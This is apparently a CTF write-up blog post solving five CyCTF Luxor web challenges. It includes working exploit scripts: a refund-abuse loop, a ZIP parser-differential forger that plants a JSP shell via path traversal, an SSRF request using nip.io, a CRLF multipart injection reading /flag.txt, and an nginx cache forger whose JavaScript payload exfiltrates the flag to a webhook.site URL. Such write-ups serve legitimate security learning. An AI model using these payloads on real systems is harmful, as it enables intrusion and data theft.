---
categories:
  - CyShield
image:
  path: /assets/posts/CyCTF-Luxor/preview.png
layout: post
stags:
title: CyCTF Luxor
---

# Nova Shop
The challenge isn't mostly technical but rather a flaw in the logic of the application itself Nova Shop is an online shop where you signup then wait to get verified then you could start making some orders buying stuff and there is even a refund feature let's look at the code

First we need to sign up looking at the `auth.py` we could see that we can bypass verification by going to /api/verifty and including just mail we signed up with 
![](/assets/posts/CyCTF-Luxor/CyCTF-Luxor,.png)

To get the flag we need to buy the `The Ultimate Flag` which costs `$10000`, looking in code we could identify the issue the issue is that we could buy a coupon of `%20` discount with only `10$` then we could buy anything else with a discount of `%20` then go to the refund endpoint which refunds the entire price simple example
```
balance = 200
buy coupon ; balance = 190
buy Data Vault which is 150$ with discount => 150 - (150)* 0.2 ; with discount 120
then refund 
total payed 10 + 120 = 130; refund 150
so that's a profit 
```
We will just keep doing this in a loop until we get enough money to buy the flag.
Create an account then verify 
![](/assets/posts/CyCTF-Luxor/CyCTF-Luxor,-1.png)

script to do this loop 
```
#!/bin/bash

# Super simple single-cycle exploit
TARGET="https://cyctf-luxor-f17da9e370c8-novashop-0-0.chals.io"
COOKIE_JAR="/tmp/cookies.txt"

# Check args
if [ $# -ne 2 ]; then
    echo "Usage: $0 <username> <password>"
    exit 1
fi

USERNAME="$1"
PASSWORD="$2"

echo "[*] Logging in as $USERNAME..."
curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"$USERNAME\",\"password\":\"$PASSWORD\"}" \
    "$TARGET/api/login" > /dev/null

echo "[*] Buying coupon (product 16)..."
coupon_response=$(curl -s -b "$COOKIE_JAR" \
    -H 'Content-Type: application/json' \
    -d '{"product_id":16}' \
    "$TARGET/api/buy")

# Extract coupon code
coupon_code=$(echo "$coupon_response" | grep -o '"coupon":"[^"]*"' | cut -d'"' -f4)
echo "[+] Got coupon: $coupon_code"

echo "[*] Buying Ghost Mouse (product 10) with coupon..."
buy_response=$(curl -s -b "$COOKIE_JAR" \
    -H 'Content-Type: application/json' \
    -d "{\"product_id\":10,\"coupon\":\"$coupon_code\"}" \
    "$TARGET/api/buy")

# Extract order ID
order_id=$(echo "$buy_response" | grep -o '"order_id":[0-9]*' | cut -d':' -f2)
echo "[+] Got order ID: $order_id"

echo "[*] Refunding product..."
refund_response=$(curl -s -b "$COOKIE_JAR" \
    -H 'Content-Type: application/json' \
    -d "{\"order_id\":$order_id}" \
    "$TARGET/api/refund")

# Extract new balance
new_balance=$(echo "$refund_response" | grep -o '"new_balance":[0-9.]*' | cut -d':' -f2)

echo "[+] New balance: $new_balance credits"
echo "[*] Profit: $(echo "$new_balance - 100" | bc) credits"

# Clean up
rm -f "$COOKIE_JAR"
```
the more expansive the item is the more profit we make but obviously we only have 100$ at first so this script is simple 
I ran the script with `watch -n 0.01` then waited till I had the credits 

![](/assets/posts/CyCTF-Luxor/CyCTF-Luxor,-4.png)



# Lazy Pharaoh 
Challenge is build on spring boot which is something we don't see very often unfortunately

The challenge is exploitable through a Zip parser differential which is also called *schizophrenic ZIP* combined with 
 - Path traversal during extraction which could also be called in some cases Zip slip
 - writeable Tomcat document root
 - and public access to jsp files
The important part here is the FileService which comes from FileController or in better words the Services is usally only used by it's corresponding Controller in most spring boot designs 
one of the first things that get's ran is the `isSafeZip` function 

![](/assets/posts/CyCTF-Luxor/CyCTF-Luxor,-2.png)
The function looks intimidating at first which is true since this function is pretty much secure the issue is that it uses ZipFile from the zip utils which parses `Central Directory` (CEN) records near the end of file
![](/assets/posts/CyCTF-Luxor/CyCTF-Luxor,-3.png)
But the actual flow after the check uses the ZipInputStream also from zip utils but this one uses `Local File Header` (LOC) before each file body
So now ZipFile reads names from the central directory and ZipInputStream reads names from local headers so we would upload a zip where the cen is benign and the LOC malicious 
we would upload to `../../../webroot/shell.jsp` with the content of `<%= System.getenv("FLAG") %>`

Example script to do that 
```
  #!/usr/bin/env python3
  import argparse
  import struct
  import zipfile
  from pathlib import Path

  LOCAL_SIG = b"PK\x03\x04"

  def patch_loc_only(src_zip, dst_zip, benign_name, malicious_name):
      benign_b = benign_name.encode("utf-8")
      malicious_b = malicious_name.encode("utf-8")

      if len(benign_b) != len(malicious_b):
          raise ValueError("benign and malicious names must have same byte length")

      data = bytearray(Path(src_zip).read_bytes())

      loc_off = data.find(LOCAL_SIG)
      if loc_off < 0:
          raise ValueError("No local file header found")

      name_len = struct.unpack_from("<H", data, loc_off + 26)[0]
      name_off = loc_off + 30
      name_end = name_off + name_len

      old_loc_name = bytes(data[name_off:name_end])
      if old_loc_name != benign_b:
          raise ValueError(
              f"First LOC name is {old_loc_name!r}, expected {benign_b!r}. "
              "Create a 1-entry benign ZIP first."
          )

      if name_len != len(malicious_b):
          raise ValueError("LOC filename length mismatch")

      # Patch LOC filename bytes only. CEN remains untouched.
      data[name_off:name_end] = malicious_b
      Path(dst_zip).write_bytes(data)

      # Verify views
      with zipfile.ZipFile(dst_zip) as zf:
          print("CEN view (ZipFile):", zf.namelist())

      b2 = Path(dst_zip).read_bytes()
      off2 = b2.find(LOCAL_SIG)
      l2 = struct.unpack_from("<H", b2, off2 + 26)[0]
      loc_name = b2[off2 + 30 : off2 + 30 + l2].decode("utf-8", "replace")
      print("LOC view (stream):", loc_name)

  if __name__ == "__main__":
      ap = argparse.ArgumentParser(description="Patch ZIP LOC name only (CEN stays benign)")
      ap.add_argument("src_zip")
      ap.add_argument("dst_zip")
      ap.add_argument("--benign", required=True, help="e.g. aaaaaaaaaaaaaaaaaaaaaa.txt")
      ap.add_argument("--malicious", required=True, help="e.g. ../../../webroot/shell.jsp")
      args = ap.parse_args()

      patch_loc_only(args.src_zip, args.dst_zip, args.benign, args.malicious)
```

![](/assets/posts/CyCTF-Luxor/CyCTF-Luxor,-5.png)

# nextBlog
Challenge is build on next.js which exposes actions to the client, one of those actions is the fetchImage(imageName) which we could use to get the flag from the internal service 
it's simple logic is just
```
const imageUrl = `http://res.cloudinary.com${imageName}`
```

and to bypass this and request the internal service is straight forward if we used `127.0.0.1.nip.io` at the end with any submdomains before `127.0.0.1` it will go straight to local host and ignore the rest this trick is used for dns testing but I have pretty much only used it for ctf challenges the last thing we need to do is to get the next-action for chunks we could dump the application and look for them with grep or directly in the browser also spoof next-router-state-tree since next.js needs it to know which page / component tree is currently rendered in the browser
``
```
curl 'http://localhost:3333/' \
  -X POST \
  -H 'Accept: text/x-component' \
  -H 'Content-Type: text/plain;charset=UTF-8' \
  -H 'next-action: 40dbf8e51a634b2293be78f80bf39442c1e97db656' \
  -H 'next-router-state-tree: ["",{"children":["__PAGE__",{}]},null,null,true]' \
  --data-binary '[".127.0.0.1.nip.io:3001/flag"]'
```

![](/assets/posts/CyCTF-Luxor/CyCTF-Luxor,-6.png)

# DevOps
Simple code but great idea, the main feature is at `/diagnostics.php`.
Before starting php version is all they from 2014 and supported until late 2018 so it's full of bugs and most of the things that do work in this challenge won't work anymore but the idea itself is pretty solid

Challenge has 2 layers an outer layer which is the frontend server that we could communicate two which then does an internal curl request to some services 


![](/assets/posts/CyCTF-Luxor/CyCTF-Luxor,-7.png)

From this code alone we could open a file directly and add it to the request by putting in the payload `@/flag.txt` since it does `parse_str` we could also control both the key and the value array 
in simple terms 
```
$str = "a=1&b=2";  
parse_str($str, $out);  
  
print_r($out);

result 
[
  "a" => "1",
  "b" => "2"
]
```
Which means we have full control over what get's passed to the internal services completely now going back to the file we could open opening the file and sending the content is just the beginning our objective now is to read this file.
Looking at the source code we could see 4 internal services only one is in our interest but why ? 
Because `operator-portal.php` is the only internal service that reflects back a request parameter that we send 
```
Attacker => frontenedservre (send params through payload) => backendserver (reflect back what we have sent)
```
![](/assets/posts/CyCTF-Luxor/CyCTF-Luxor,-8.png)
Till now everything looks straight forward from the frontend server we would use the `operator-portal` internal service with the key value pair of `token` with any value and `operatorID` with the file read we have discussed by doing the `@/flag.txt` payload but doing this won't work also why ? 
Because it treats operatorID as a file which means it is stored in `$_FILES` not `$_POST`
![](/assets/posts/CyCTF-Luxor/CyCTF-Luxor,-9.png)
And as we can see it checks for the POST value not files so we need a way to make the internal service treat it as a post value not a file
To solve this issue we need to understand how the request would look like 

```
--------------------------abc123
Content-Disposition: form-data; name="operatorId"; filename="flag.txt"
Content-Type: application/octet-stream

CyCTF{real_flag_here}
```
This get's treated as a file

So doing a CRLF on the operatorID `key` NOT `value` we could brake the filename, and with a broken filename the server would treat it as a post body 

Something like that would be treated like a post request
```
--------------------------abc123
Content-Disposition: form-data; name="operatorId"
Test: "; filename="flag.txt"
Content-Type: application/octet-stream

CyCTF{real_flag_here}
```

request from fronend to backend to get flag
```
POST /services/operator-portal.php HTTP/1.1
Host: localhost
Content-Type: multipart/form-data; boundary=------------------------abc123

--------------------------abc123
Content-Disposition: form-data; name="operatorId"
Test: "; filename="flag.txt"
Content-Type: application/octet-stream

CyCTF{real_flag_here}
--------------------------abc123
Content-Disposition: form-data; name="token"

x
--------------------------abc123--
```

```
name="operatorID" (<- this double quote is ours) \r\n for a new line test: # and the rest is ignored the filename isn't there any more
```

to make this work we would make the payload as Follows 
```
operatorId%22%0D%0ATest:%20=@/flag.txt&token=x
```
We broke the file and made it look like a post body 
![](/assets/posts/CyCTF-Luxor/CyCTF-Luxor,-10.png)
# Clear
The challenge has just one important propertie:
 - The upload endpoint trusts the original file name and joins it directly into a filesystem path. 

The admin bot loads `/static/js/dashboard.js` in the browser so the challenge would be to overwrite the `dashboard.js` with our payload and exfiltrate the flag 

Arbitrary file write 
```python 
original_name = file.filename sanitized_name = secure_filename(file.filename) save_path = os.path.join(app.config["UPLOAD_FOLDER"], original_name) os.makedirs(os.path.dirname(save_path), exist_ok=True) file.save(save_path)
```

The only issue is that we are running as the nginx user and we can't write to `/app/static/js` since it's owned by root but we can make a leverage of something in nginx.conf
![](/assets/posts/CyCTF-Luxor/CyCTF-Luxor,-11.png)

Location `/static/` are cached for 5 minutes and those caches are owned by the nginx user which means we could overwrite them so the plan to user the Arbitrary file write to overwrite the cache and make the admin load the malicious cache instead of the actual code after doing some digging we could find the structure of nginx cache

```
+-------------------------------+
| ngx_http_file_cache_header_t  |  fixed-size binary metadata
+-------------------------------+
| ngx_http_file_cache_key       |  small fixed key wrapper
+-------------------------------+
| cache key bytes              |
| '\0'                         |
+-------------------------------+
| serialized cached headers    |
+-------------------------------+
| cached response body bytes   |
+-------------------------------+
```

and to forge a cache file we could use this code
```
#!/usr/bin/env python3
import struct
import time
import zlib

# Hardcoded values
CACHE_KEY = "http://localhost:5000/static/js/dashboard.js"
PAYLOAD = b"fetch('/flag').then(r=>r.text()).then(flag=>location='https://webhook.site/8908c286-5ff1-481b-9920-c4f7f9642eb5?flag='+encodeURIComponent(flag));%"
OUTPUT_FILE = "forged_cache.bin"

# Define the header format
fmt = "<QqqqqqIHHHB128sB128s16s4x"
header_size = struct.calcsize(fmt)

# Build HTTP headers
http_headers = (
    b"HTTP/1.1 200 OK\r\n"
    b"Content-Type: application/javascript\r\n"
    + f"Content-Length: {len(PAYLOAD)}\r\n".encode()
    + b"\r\n"
)

# Calculate positions
header_start = header_size + len(b"\nKEY: ") + len(CACHE_KEY.encode()) + 1
body_start = header_start + len(http_headers)

# Generate timestamps and CRC
now = int(time.time())
crc32 = zlib.crc32(CACHE_KEY.encode()) & 0xFFFFFFFF

# Pack the header
header = struct.pack(
    fmt,
    5,                          # magic number
    now + 300,                   # expires
    0,                           # etag size
    0,                           # last modified
    0,                           # varies
    now,                         # date
    crc32,                       # crc32
    0,                           # padding
    header_start,                 # header start
    body_start,                   # body start
    0,                           # ref count
    b"\x00" * 128,                # accept encoding
    0,                           # varies count
    b"\x00" * 128,                # varies data
    b"\x00" * 16,                 # padding
)

# Build complete cache file
forged = header + b"\nKEY: " + CACHE_KEY.encode() + b"\n" + http_headers + PAYLOAD

# Write to output file
with open(OUTPUT_FILE, "wb") as f:
    f.write(forged)

print(f"[*] wrote {OUTPUT_FILE} ({len(forged)} bytes)")
```


And where the file lives we could calculate it with this code 
```
#!/usr/bin/env python3
import hashlib
import json

ASSET_PATH = "/static/js/dashboard.js"

def main():
    # Validate asset path
    if not ASSET_PATH.startswith("/"):
        raise SystemExit("[!] asset_path must start with '/'")
    
    # Compute cache key and MD5
    cache_key = f"http://localhost:5000{ASSET_PATH}"
    md5 = hashlib.md5(cache_key.encode()).hexdigest()
    upload_path = f"../../var/cache/nginx/{md5[-1]}/{md5[-3:-1]}/{md5}"
    
    # Create/update state.json with computed values
    state = {
        "asset_path": ASSET_PATH,
        "cache_key": cache_key,
        "cache_md5": md5,
        "upload_path": upload_path
    }
    
    # Save to state.json
    with open("state.json", 'w') as f:
        json.dump(state, f, indent=2)
    
    # Print results
    print(f"[*] asset path: {ASSET_PATH}")
    print(f"[*] cache key: {cache_key}")
    print(f"[*] cache md5: {md5}")
    print(f"[*] traversal upload path: {upload_path}")
    print(f"[*] Updated state.json with computed values")

if __name__ == "__main__":
    main()
```

we would get this 
```
[*] asset path: /static/js/dashboard.js
[*] cache key: http://localhost:5000/static/js/dashboard.js
[*] cache md5: 8506729f374636e55036550657970e1d
[*] traversal upload path: ../../var/cache/nginx/d/e1/8506729f374636e55036550657970e1d
[*] Updated state.json with computed values
```
Upload path is `../../var/cache/nginx/d/e1/8506729f374636e55036550657970e1d`

![](/assets/posts/CyCTF-Luxor/CyCTF-Luxor,-12.png)

Finally fire a complaint and get the flag 
![](/assets/posts/CyCTF-Luxor/CyCTF-Luxor,-13.png)
![](/assets/posts/CyCTF-Luxor/CyCTF-Luxor,-14.png)
